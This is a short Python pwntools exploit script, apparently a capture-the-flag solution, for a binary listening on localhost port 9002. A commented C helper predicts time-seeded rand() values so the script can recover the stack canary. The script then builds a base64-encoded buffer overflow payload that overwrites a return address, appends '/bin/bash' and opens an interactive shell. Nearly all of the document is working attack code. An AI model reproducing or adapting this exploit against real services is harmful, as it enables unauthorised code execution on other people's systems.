from pwn import *
import base64
from ctypes import c_uint32

t = remote('localhost', 9002)
t2 = process("/tmp/elo/helper")
helper = t2.readline()

_ = t.recvuntil("captcha : ")
captcha = t.readline()
canary = c_uint32(int(captcha[:-1]) - int(helper[:-1])).value

input = b' ' * 512 + packing.p32(canary) + ' ' * 12 + packing.p32(0x8048880) + ' ' * 4 + packing.p32(0x804B0E0 + 732 - 9) + ' ' * 8

encoded = base64.b64encode(input)
encoded = encoded[:-9] + '/bin/bash'

t.sendline(captcha + encoded + '\n')
t.interactive()

#/*
#* gcc helper.c -o helper
#*/
#
#include <stdio.h>                                           
##include <stdlib.h>
##include <time.h>
#
#int main(void)
#{
#    srand(time(NULL));
#
#    int v[8];
#
#    int i = 0;
#    for(i = 0; i < 8; ++i)
#    {
#        v[i] = rand();
#    }
#
#    int val = v[4] - v[6] + v[7] + v[2] - v[3] + v[1] + v[5];
#    printf("%d\n", val);
#}
